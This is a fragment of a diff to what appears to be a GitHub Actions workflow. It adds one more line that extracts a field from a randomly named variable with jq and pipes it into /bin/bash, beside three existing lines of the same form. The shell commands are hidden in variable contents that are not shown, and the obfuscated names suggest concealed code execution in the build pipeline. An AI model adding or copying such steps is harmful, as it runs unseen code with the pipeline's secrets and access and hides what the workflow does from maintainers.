@@ -40,6 +40,7 @@ jobs:
           echo $kxafz7 | jq -r .ybtkd3583 | /bin/bash
           echo $ezgai3612 | jq -r .npw62 | /bin/bash
           printf '%s' "$pzdy010" | jq -r .yab59965 | /bin/bash
+          echo $ndd16040 | jq -r .t17 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
